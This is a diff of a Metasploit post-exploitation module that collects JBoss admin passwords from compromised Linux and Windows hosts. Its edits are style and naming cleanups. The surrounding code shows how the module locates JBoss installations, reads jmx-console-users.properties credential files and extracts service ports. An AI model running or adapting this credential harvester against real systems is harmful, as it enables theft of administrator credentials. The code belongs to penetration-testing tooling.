@@ -13,20 +13,25 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'Jboss Credential Collector',
+        'Name' => 'JBoss Credential Collector',
         'Description' => %q{
-          This module can be used to extract the Jboss admin passwords for version 4,5 and 6.
+          This module can be used to extract the JBoss admin passwords for version 4, 5 and 6.
         },
         'License' => MSF_LICENSE,
         'Author' => [ 'Koen Riepe (koen.riepe@fox-it.com)' ],
         'Platform' => [ 'linux', 'win' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
 
   def report_creds(user, pass, port)
-    return if (user.empty? || pass.empty?)
+    return if user.empty? || pass.empty?
 
     # Assemble data about the credential objects we will be creating
     credential_data = {
@@ -41,7 +46,7 @@ class MetasploitModule < Msf::Post
 
     credential_core = create_credential(credential_data)
 
-    if !port.is_a? Integer
+    if !port.is_a?(Integer)
       print_error('Failed to detect port, defaulting to 8080 for creds database')
       port = 8080
     end
@@ -101,7 +106,7 @@ class MetasploitModule < Msf::Post
         end
       end
       if version != 'NONE'
-        print_status("Found a Jboss installation version: #{version}")
+        print_status("Found a JBoss installation version: #{version}")
         home = readhome(cmd_exec('printenv').split("\n"))
         pwfiles = getpwfiles(cmd_exec('locate jmx-console-users.properties').split("\n"), home, version)
         listenports = getports(version)
@@ -128,7 +133,7 @@ class MetasploitModule < Msf::Post
         end
       end
       if version != 'NONE'
-        print_status("Found a Jboss installation version: #{version}")
+        print_status("Found a JBoss installation version: #{version}")
         instances = wingetinstances(home, version)
         pwfiles = winpwfiles(instances)
         listenports = wingetport(instances)
@@ -165,7 +170,7 @@ class MetasploitModule < Msf::Post
     type1.each do |file1|
       next unless file1 && file1.include?(version)
 
-      print_status("Attempting to extract Jboss service ports from: #{file1}")
+      print_status("Attempting to extract JBoss service ports from: #{file1}")
       begin
         file1_read = read_file(file1).split("\n")
       rescue StandardError
@@ -177,13 +182,13 @@ class MetasploitModule < Msf::Post
       file1_read.each do |line|
         if line.strip.include? 'deploy/httpha-invoker.sar'
           parse = true
-        elsif ((line.strip == '</bean>') && portfound)
+        elsif (line.strip == '</bean>') && portfound
           parse = false
         elsif parse && line.include?('<property name="port">')
           portnr = line.split('<property name="port">')[1].split('<')[0].to_i
           port.push(portnr)
           portfound = true
-          print_good("Jboss port found: #{portnr}")
+          print_good("JBoss port found: #{portnr}")
         end
       end
     end
@@ -191,7 +196,7 @@ class MetasploitModule < Msf::Post
     type2.each do |file2|
       next unless file2 && file2.include?(version)
 
-      print_status("Attempting to extract Jboss service ports from: #{file2}")
+      print_status("Attempting to extract JBoss service ports from: #{file2}")
       begin
         xml2 = Nokogiri::XML(read_file(file2))
       rescue StandardError
@@ -203,7 +208,7 @@ class MetasploitModule < Msf::Post
 
         portnr = connector['port'].to_i
         port.push(portnr)
-        print_good("Jboss port found: #{portnr}")
+        print_good("JBoss port found: #{portnr}")
         break
       end
     end
@@ -211,8 +216,8 @@ class MetasploitModule < Msf::Post
   end
 
   def gathernix
-    print_status('Unix OS detected, attempting to locate Jboss services')
-    version = getversion(cmd_exec('locate jar-versions.xml').split("\n"))
+    print_status('Unix OS detected, attempting to locate JBoss services')
+    getversion(cmd_exec('locate jar-versions.xml').split("\n"))
   end
 
   def winhome
@@ -221,7 +226,7 @@ class MetasploitModule < Msf::Post
     exec.each do |line|
       next unless line.downcase.include?('java.exe') && line.downcase.include?('jboss')
 
-      print_status('Jboss service found')
+      print_status('JBoss service found')
       parse = line.split('-classpath "')[1].split('\\bin\\')[0]
       if parse[0] == ';'
         home.push(parse.split(';')[1])
@@ -273,33 +278,33 @@ class MetasploitModule < Msf::Post
       end
 
       if file1
-        print_status("Attempting to extract Jboss service ports from: #{seed}\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml")
+        print_status("Attempting to extract JBoss service ports from: #{seed}\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml")
         parse = false
         portfound = false
         file1.each do |line|
           if line.strip.include? 'deploy/httpha-invoker.sar'
             parse = true
-          elsif ((line.strip == '</bean>') && portfound)
+          elsif (line.strip == '</bean>') && portfound
             parse = false
           elsif parse && line.include?('<property name="port">')
             portnr = line.split('<property name="port">')[1].split('<')[0].to_i
             port.push(portnr)
             portfound = true
-            print_good("Jboss port found: #{portnr}")
+            print_good("JBoss port found: #{portnr}")
           end
         end
       end
 
       next unless file2
 
-      print_status("Attempting to extract Jboss service ports from: #{seed}\\deploy\\jboss-web.deployer\\server.xml")
+      print_status("Attempting to extract JBoss service ports from: #{seed}\\deploy\\jboss-web.deployer\\server.xml")
       xml2 = Nokogiri::XML(file2)
       xml2.xpath('//Server//Connector').each do |connector|
         next unless connector['protocol'].include? 'HTTP'
 
         portnr = connector['port'].to_i
         port.push(portnr)
-        print_good("Jboss port found: #{portnr}")
+        print_good("JBoss port found: #{portnr}")
         break
       end
     end
@@ -308,20 +313,22 @@ class MetasploitModule < Msf::Post
 
   def gatherwin
     print_status('Windows OS detected, enumerating services')
-    homeArray = winhome
-    if !homeArray.empty?
-      homeArray.each do |home|
-        version_file = []
-        version_file.push("#{home}\\jar-versions.xml")
-        version = wingetversion(version_file, home)
-      end
-    else
-      print_status('No Jboss service has been found')
+    home_array = winhome
+
+    if home_array.empty?
+      print_status('No JBoss service has been found')
+      return
+    end
+
+    home_array.each do |home|
+      version_file = []
+      version_file.push("#{home}\\jar-versions.xml")
+      wingetversion(version_file, home)
     end
   end
 
   def run
-    if sysinfo['OS'].include? 'Windows'
+    if sysinfo['OS'].include?('Windows')
       gatherwin
     else
       gathernix
